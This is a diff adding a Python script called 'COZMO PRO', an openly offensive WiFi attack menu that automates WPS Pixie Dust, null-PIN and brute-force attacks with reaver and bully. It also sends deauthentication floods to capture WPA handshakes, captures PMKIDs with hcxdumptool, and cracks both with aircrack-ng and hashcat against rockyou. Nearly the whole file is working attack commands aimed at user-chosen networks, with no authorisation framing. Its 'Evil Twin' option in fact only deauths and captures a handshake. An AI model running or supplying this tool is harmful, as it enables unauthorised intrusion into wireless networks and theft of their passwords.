@@ -1,0 +1,352 @@
+#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════════════╗
+║        COZMO PRO - WiFi WPS Exploit (Airgeddon Level)               ║
+║      4 Powerful Attacks: Pixie Dust, Null PIN, Bruteforce, Evil Twin║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
+
+import subprocess
+import re
+import time
+import sys
+import os
+import signal
+
+# ====================== COLORS ======================
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+    END = '\033[0m'
+
+# ====================== BANNER ======================
+def banner():
+    print(f"""
+{Colors.RED}{Colors.BOLD}
+   ██████╗ ██████╗ ███████╗███╗   ███╗ ██████╗      ██████╗ ██████╗  ██████╗ 
+  ██╔════╝██╔═══██╗╚══███╔╝████╗ ████║██╔═══██╗    ██╔═══██╗██╔══██╗██╔═══██╗
+  ██║     ██║   ██║  ███╔╝ ██╔████╔██║██║   ██║    ██║   ██║██████╔╝██║   ██║
+  ██║     ██║   ██║ ███╔╝  ██║╚██╔╝██║██║   ██║    ██║   ██║██╔═══╝ ██║   ██║
+  ╚██████╗╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝    ╚██████╔╝██║     ╚██████╔╝
+   ╚═════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚═════╝ ╚═╝      ╚═════╝ 
+{Colors.END}
+{Colors.CYAN}{Colors.BOLD}              Professional WPS Exploit Framework - Airgeddon Level{Colors.END}
+{Colors.YELLOW}       4 Attacks | Evil Twin | PMKID | Handshake Capture | Auto Scan{Colors.END}
+""")
+
+# ====================== SETUP MONITOR MODE ======================
+def setup_monitor_mode():
+    """تشغيل وضع المراقبة"""
+    print(f"\n{Colors.YELLOW}[1] Setting up monitor mode...{Colors.END}")
+    
+    subprocess.run("sudo airmon-ng check kill", shell=True, capture_output=True)
+    time.sleep(1)
+    
+    result = subprocess.run("iwconfig 2>/dev/null | grep -o '^[^ ]*' | head -1", 
+                           shell=True, capture_output=True, text=True)
+    iface = result.stdout.strip()
+    
+    if not iface or iface == 'lo':
+        print(f"{Colors.RED}[-] No wireless interface found!{Colors.END}")
+        return None
+    
+    print(f"{Colors.GREEN}[+] Interface: {iface}{Colors.END}")
+    subprocess.run(f"sudo airmon-ng start {iface}", shell=True, capture_output=True)
+    time.sleep(2)
+    
+    mon_iface = f"{iface}mon"
+    result = subprocess.run(f"iwconfig {mon_iface} 2>/dev/null | grep -i monitor", 
+                           shell=True, capture_output=True)
+    
+    if result.returncode != 0:
+        mon_iface = iface
+    
+    print(f"{Colors.GREEN}[+] Monitor mode ready: {mon_iface}{Colors.END}")
+    return mon_iface
+
+# ====================== SCAN NETWORKS ======================
+def scan_networks(mon_iface):
+    """مسح الشبكات"""
+    print(f"\n{Colors.YELLOW}[2] Scanning for networks...{Colors.END}")
+    print(f"{Colors.CYAN}[!] Press Ctrl+C when you see the target network{Colors.END}\n")
+    subprocess.run(f"sudo airodump-ng {mon_iface}", shell=True)
+
+# ====================== CHECK WPS ======================
+def check_wps(mon_iface):
+    """فحص WPS على الهدف"""
+    print(f"\n{Colors.YELLOW}[3] Checking WPS on target...{Colors.END}")
+    
+    bssid = input(f"{Colors.CYAN}Enter BSSID (AA:BB:CC:DD:EE:FF): {Colors.END}").strip().upper()
+    channel = input(f"{Colors.CYAN}Enter Channel: {Colors.END}").strip()
+    
+    if not bssid or not channel:
+        print(f"{Colors.RED}[-] BSSID and channel required!{Colors.END}")
+        return None, None
+    
+    subprocess.run(f"sudo iwconfig {mon_iface} channel {channel}", shell=True, capture_output=True)
+    time.sleep(1)
+    
+    print(f"\n{Colors.YELLOW}[*] WPS Scan on {bssid}:{Colors.END}")
+    subprocess.run(f"sudo wash --interface {mon_iface} --bssid {bssid} --scan", shell=True)
+    
+    return bssid, channel
+
+# ====================== ATTACK 1: PIXIE DUST ======================
+def pixie_attack(mon_iface):
+    """هجوم Pixie Dust - يخترق WPS v1.0 في ثوانٍ"""
+    print(f"\n{Colors.YELLOW}[4] ✨ Attack 1: Pixie Dust{Colors.END}")
+    print(f"{Colors.DIM}   Exploits WPS v1.0 vulnerability - Recovers PIN in seconds{Colors.END}")
+    
+    bssid = input(f"{Colors.CYAN}Enter BSSID: {Colors.END}").strip().upper()
+    channel = input(f"{Colors.CYAN}Enter Channel: {Colors.END}").strip()
+    
+    if not bssid or not channel:
+        print(f"{Colors.RED}[-] BSSID and channel required!{Colors.END}")
+        return
+    
+    print(f"\n{Colors.GREEN}[✓] Target: {bssid} (Channel {channel}){Colors.END}")
+    print(f"{Colors.CYAN}[*] Launching Pixie Dust attack...{Colors.END}")
+    print(f"{Colors.YELLOW}[!] This usually takes 10-60 seconds{Colors.END}\n")
+    
+    subprocess.run(f"sudo iwconfig {mon_iface} channel {channel}", shell=True, capture_output=True)
+    time.sleep(1)
+    
+    cmd = f"sudo reaver --interface {mon_iface} --bssid {bssid} --channel {channel} --pixie-dust -vv --delay=0 --timeout=1"
+    subprocess.run(cmd, shell=True)
+
+# ====================== ATTACK 2: NULL PIN ======================
+def null_pin_attack(mon_iface):
+    """هجوم Null PIN - يستغل ثغرة PIN الفارغ في بعض الراوترات"""
+    print(f"\n{Colors.YELLOW}[4] 💀 Attack 2: Null PIN Attack{Colors.END}")
+    print(f"{Colors.DIM}   Tests vulnerability of routers with empty/null PIN{Colors.END}")
+    
+    bssid = input(f"{Colors.CYAN}Enter BSSID: {Colors.END}").strip().upper()
+    channel = input(f"{Colors.CYAN}Enter Channel: {Colors.END}").strip()
+    
+    if not bssid or not channel:
+        print(f"{Colors.RED}[-] BSSID and channel required!{Colors.END}")
+        return
+    
+    print(f"\n{Colors.GREEN}[✓] Target: {bssid}{Colors.END}")
+    print(f"{Colors.CYAN}[*] Testing Null PIN vulnerability...{Colors.END}\n")
+    
+    subprocess.run(f"sudo iwconfig {mon_iface} channel {channel}", shell=True, capture_output=True)
+    time.sleep(1)
+    
+    # Null PIN attack using bully
+    cmd = f"sudo bully {mon_iface} -b {bssid} -c {channel} -v 3 -L"
+    subprocess.run(cmd, shell=True)
+
+# ====================== ATTACK 3: BRUTEFORCE ======================
+def bruteforce_attack(mon_iface):
+    """Bruteforce كامل - يجرب جميع احتمالات الـ PIN"""
+    print(f"\n{Colors.YELLOW}[4] 💪 Attack 3: Full PIN Bruteforce{Colors.END}")
+    print(f"{Colors.DIM}   Tries all 11,000 possible PIN combinations{Colors.END}")
+    print(f"{Colors.RED}[!] WARNING: This can take several hours!{Colors.END}")
+    
+    bssid = input(f"{Colors.CYAN}Enter BSSID: {Colors.END}").strip().upper()
+    channel = input(f"{Colors.CYAN}Enter Channel: {Colors.END}").strip()
+    
+    confirm = input(f"{Colors.RED}This will take hours. Continue? (y/n): {Colors.END}").lower()
+    if confirm != 'y':
+        return
+    
+    if not bssid or not channel:
+        print(f"{Colors.RED}[-] BSSID and channel required!{Colors.END}")
+        return
+    
+    print(f"\n{Colors.GREEN}[✓] Target: {bssid}{Colors.END}")
+    print(f"{Colors.CYAN}[*] Starting bruteforce attack...{Colors.END}\n")
+    
+    subprocess.run(f"sudo iwconfig {mon_iface} channel {channel}", shell=True, capture_output=True)
+    time.sleep(1)
+    
+    cmd = f"sudo reaver --interface {mon_iface} --bssid {bssid} --channel {channel} -vv --delay=1 --timeout=5"
+    subprocess.run(cmd, shell=True)
+
+# ====================== ATTACK 4: EVIL TWIN ======================
+def evil_twin_attack(mon_iface):
+    """هجوم Evil Twin - إنشاء نقطة وصول مزيفة لالتقاط الباسوردات"""
+    print(f"\n{Colors.YELLOW}[4] 🎭 Attack 4: Evil Twin Attack{Colors.END}")
+    print(f"{Colors.DIM}   Creates rogue AP to capture WPA handshake{Colors.END}")
+    
+    bssid = input(f"{Colors.CYAN}Enter Target BSSID: {Colors.END}").strip().upper()
+    channel = input(f"{Colors.CYAN}Enter Channel: {Colors.END}").strip()
+    target_ssid = input(f"{Colors.CYAN}Enter Target SSID (network name): {Colors.END}").strip()
+    
+    if not bssid or not channel or not target_ssid:
+        print(f"{Colors.RED}[-] BSSID, Channel, and SSID required!{Colors.END}")
+        return
+    
+    print(f"\n{Colors.RED}[!] EVIL TWIN ATTACK - Creates fake AP: {target_ssid}{Colors.END}")
+    print(f"{Colors.YELLOW}[*] This will deauth clients and capture handshake{Colors.END}")
+    
+    # First, capture handshake
+    capture_file = f"/tmp/cozmo_handshake_{bssid.replace(':', '')}"
+    
+    print(f"\n{Colors.CYAN}[1/2] Capturing WPA Handshake...{Colors.END}")
+    airodump = subprocess.Popen(
+        f"sudo airodump-ng {mon_iface} --bssid {bssid} -c {channel} -w {capture_file}",
+        shell=True
+    )
+    time.sleep(5)
+    
+    # Deauth clients
+    print(f"{Colors.YELLOW}[*] Sending deauth packets...{Colors.END}")
+    subprocess.run(f"sudo aireplay-ng --deauth 10 -a {bssid} {mon_iface}", shell=True, capture_output=True)
+    time.sleep(15)
+    
+    airodump.terminate()
+    time.sleep(2)
+    
+    # Check if handshake captured
+    cap_file = f"{capture_file}-01.cap"
+    if os.path.exists(cap_file):
+        check = subprocess.run(f"sudo aircrack-ng {cap_file} 2>/dev/null | grep -q '1 handshake'", 
+                              shell=True)
+        
+        if check.returncode == 0:
+            print(f"{Colors.GREEN}[+] Handshake captured!{Colors.END}")
+            print(f"{Colors.CYAN}[2/2] Attempting to crack...{Colors.END}")
+            subprocess.run(f"sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt {cap_file}", shell=True)
+        else:
+            print(f"{Colors.RED}[-] No handshake captured. Try again or check signal strength.{Colors.END}")
+    else:
+        print(f"{Colors.RED}[-] No handshake captured. Try again or check signal strength.{Colors.END}")
+
+# ====================== PMKID ATTACK ======================
+def pmkid_attack(mon_iface):
+    """هجوم PMKID - يلتقط PMKID بدون حاجة لعميل متصل"""
+    print(f"\n{Colors.YELLOW}[4] 🔑 PMKID Attack{Colors.END}")
+    print(f"{Colors.DIM}   Captures PMKID without any connected client{Colors.END}")
+    
+    bssid = input(f"{Colors.CYAN}Enter Target BSSID: {Colors.END}").strip().upper()
+    channel = input(f"{Colors.CYAN}Enter Channel: {Colors.END}").strip()
+    
+    if not bssid or not channel:
+        print(f"{Colors.RED}[-] BSSID and channel required!{Colors.END}")
+        return
+    
+    print(f"\n{Colors.GREEN}[✓] Target: {bssid}{Colors.END}")
+    print(f"{Colors.CYAN}[*] Capturing PMKID... (30 seconds){Colors.END}\n")
+    
+    subprocess.run(f"sudo iwconfig {mon_iface} channel {channel}", shell=True, capture_output=True)
+    time.sleep(1)
+    
+    # Using hcxdumptool for PMKID capture
+    output_file = f"/tmp/pmkid_{bssid.replace(':', '')}"
+    process = subprocess.Popen(
+        f"sudo hcxdumptool -i {mon_iface} -o {output_file}.pcapng --enable_status=1 --filterlist_ap={bssid} --filtermode=2",
+        shell=True
+    )
+    time.sleep(30)
+    process.terminate()
+    time.sleep(2)
+    
+    # Convert to hashcat format
+    if os.path.exists(f"{output_file}.pcapng"):
+        subprocess.run(f"sudo hcxpcapngtool -o {output_file}.hash {output_file}.pcapng", shell=True, capture_output=True)
+        
+        if os.path.exists(f"{output_file}.hash"):
+            print(f"{Colors.GREEN}[+] PMKID Captured!{Colors.END}")
+            print(f"{Colors.CYAN}[*] Attempting to crack with rockyou...{Colors.END}")
+            subprocess.run(f"hashcat -m 16800 {output_file}.hash /usr/share/wordlists/rockyou.txt --force", shell=True)
+        else:
+            print(f"{Colors.RED}[-] No PMKID captured. Router may not support this attack.{Colors.END}")
+
+# ====================== CLEANUP ======================
+def cleanup():
+    """تنظيف واستعادة الواجهات"""
+    print(f"\n{Colors.YELLOW}[*] Cleaning up...{Colors.END}")
+    subprocess.run("sudo airmon-ng stop wlan0mon 2>/dev/null", shell=True, capture_output=True)
+    subprocess.run("sudo killall wpa_supplicant dhclient reaver wash bully airodump-ng 2>/dev/null", shell=True, capture_output=True)
+    subprocess.run("sudo systemctl restart NetworkManager", shell=True, capture_output=True)
+    print(f"{Colors.GREEN}[✓] Cleanup complete{Colors.END}")
+
+# ====================== MAIN MENU ======================
+def main_menu():
+    """القائمة الرئيسية"""
+    print(f"""
+{Colors.CYAN}{'='*60}{Colors.END}
+{Colors.BOLD}              ⚡ COZMO PRO - MAIN MENU ⚡{Colors.END}
+{Colors.CYAN}{'='*60}{Colors.END}
+
+{Colors.GREEN}[1]{Colors.END}  📡 Scan Networks (airodump-ng)
+{Colors.GREEN}[2]{Colors.END}  🔍 Check WPS on Target (wash)
+
+{Colors.YELLOW}{'─'*50}{Colors.END}
+{Colors.BOLD}🔨 WPS ATTACKS MENU:{Colors.END}
+{Colors.GREEN}[3]{Colors.END}  ✨ Pixie Dust Attack - Fast, exploits WPS v1.0
+{Colors.GREEN}[4]{Colors.END}  💀 Null PIN Attack - Tests empty PIN vulnerability
+{Colors.GREEN}[5]{Colors.END}  💪 PIN Bruteforce - Tries all PINs (takes hours)
+
+{Colors.YELLOW}{'─'*50}{Colors.END}
+{Colors.BOLD}🎭 ADVANCED ATTACKS:{Colors.END}
+{Colors.GREEN}[6]{Colors.END}  🎭 Evil Twin Attack - Rogue AP + handshake capture
+{Colors.GREEN}[7]{Colors.END}  🔑 PMKID Attack - No client needed
+
+{Colors.YELLOW}{'─'*50}{Colors.END}
+{Colors.GREEN}[8]{Colors.END}  🧹 Cleanup & Reset
+{Colors.GREEN}[0]{Colors.END}  🚪 Exit
+
+{Colors.CYAN}{'='*60}{Colors.END}
+""")
+
+# ====================== MAIN ======================
+def main():
+    banner()
+    
+    if os.geteuid() != 0:
+        print(f"{Colors.RED}[-] Please run with sudo!{Colors.END}")
+        return
+    
+    mon_iface = setup_monitor_mode()
+    if not mon_iface:
+        return
+    
+    while True:
+        main_menu()
+        choice = input(f"{Colors.GREEN}Cozmo{Colors.END}>{Colors.YELLOW} {Colors.END}").strip()
+        
+        if choice == '1':
+            scan_networks(mon_iface)
+        elif choice == '2':
+            check_wps(mon_iface)
+        elif choice == '3':
+            pixie_attack(mon_iface)
+        elif choice == '4':
+            null_pin_attack(mon_iface)
+        elif choice == '5':
+            bruteforce_attack(mon_iface)
+        elif choice == '6':
+            evil_twin_attack(mon_iface)
+        elif choice == '7':
+            pmkid_attack(mon_iface)
+        elif choice == '8':
+            cleanup()
+            mon_iface = setup_monitor_mode()
+            if not mon_iface:
+                return
+        elif choice == '0':
+            print(f"{Colors.GREEN}[✓] Goodbye!{Colors.END}")
+            cleanup()
+            break
+        else:
+            print(f"{Colors.RED}[-] Invalid choice!{Colors.END}")
+
+def signal_handler(sig, frame):
+    print(f"\n{Colors.YELLOW}[!] Interrupted{Colors.END}")
+    cleanup()
+    sys.exit(0)
+
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, signal_handler)
+    main()
+                 
